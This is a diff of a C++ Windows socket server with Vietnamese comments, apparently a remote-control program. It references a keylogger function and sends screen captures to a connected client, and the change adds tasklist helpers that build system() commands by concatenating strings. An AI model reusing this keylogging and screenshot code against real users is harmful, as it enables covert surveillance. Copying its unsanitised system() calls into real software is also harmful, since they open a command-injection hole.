@@ -112,7 +112,7 @@ void StartKeylogger(SOCKET clientSocket) {
     }
     logFile.close();
 }
-void captureScreen(const char* filename) {
+void captureScreen(const std::string& filename) {
     int x1 = 0, y1 = 0;
     int x2 = GetSystemMetrics(SM_CXSCREEN);
     int y2 = GetSystemMetrics(SM_CYSCREEN);
@@ -158,7 +158,6 @@ void captureScreen(const char* filename) {
     DeleteObject(hBitmap);
     DeleteDC(hDC);
 }
-
 void sendScreenshot(SOCKET clientSocket) {
     captureScreen("screenshot.bmp");
 
@@ -219,24 +218,55 @@ bool startApp(const std::string& appName) {
     int result = system(command.c_str());
     return result == 0;
 }
-void runCommand(SOCKET clientSocket) {
+bool Listapp(const std::string& filename) {
     // Thực thi lệnh tasklist để lấy danh sách tiến trình
-    FILE* pipe = _popen("tasklist /FI \"SESSIONNAME eq Console\"", "r");
-    if (!pipe) {
+    /*std::ifstream ip("tasklist /FI \"SESSIONNAME eq Console\"");
+    if (!ip.is_open()) {
         std::cerr << "tasklist fail" << std::endl;
-        return;
+        return false;
     }
+    std::ofstream op(filename);
+    std::string line;
+    while (getline(ip, line)) {
+        op << line << std::endl;
+    }
+    ip.close();
+    op.close();*/
+    // Lệnh tasklist lọc chỉ ứng dụng đang chạy
+    std::string command = "tasklist /FI \"SESSIONNAME eq Console\" /FO LIST > " + filename;
+    int result = system(command.c_str());
 
-    char buffer[BUFFER_SIZE];
-    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-        // Gửi từng dòng kết quả về cho client
-        if (send(clientSocket, buffer, strlen(buffer), 0) == SOCKET_ERROR) {
-            std::cerr << "ERROR : " << WSAGetLastError() << std::endl;
-            break;
-        }
-        memset(buffer, 0, sizeof(buffer));
+    if (result == 0) {
+        return true;
     }
-    _pclose(pipe);
+    else {
+        return false;
+    }
+}
+bool ListService(const std::string& filename) {
+    // Thực thi lệnh tasklist để lấy danh sách tiến trình
+   /* std::ifstream ip("tasklist /FI \"SESSIONNAME eq Service\"");
+    if (!ip.is_open()) {
+        std::cerr << "tasklist fail" << std::endl;
+        return false;
+    }
+    std::ofstream op(filename);
+    std::string line;
+    while (getline(ip, line)) {
+        op << line << std::endl;
+    }
+    ip.close();
+    op.close();*/
+    // Lệnh tasklist lọc chỉ ứng dụng đang chạy
+    std::string command = "tasklist /FI \"SESSIONNAME eq Service\" /FO LIST > " + filename;
+    int result = system(command.c_str());
+
+    if (result == 0) {
+        return true;
+    }
+    else {
+        return false;
+    }
 }
 void findAndOpenExecutable(const fs::path& directory, const std::string& exeName) {
     try {
@@ -316,7 +346,7 @@ int main() {
            std::cout << "Command from Client: " << buffer << std::endl;
            // Xử lý lệnh từ client
            if (strcmp(buffer, "List app") == 0) {
-               runCommand(clientSocket);
+               //runCommand(clientSocket);
                // Gửi chuỗi thông báo kết thúc
                std::string endMessage = "END_OF_RESPONSE";
                send(clientSocket, endMessage.c_str(), endMessage.length(), 0);
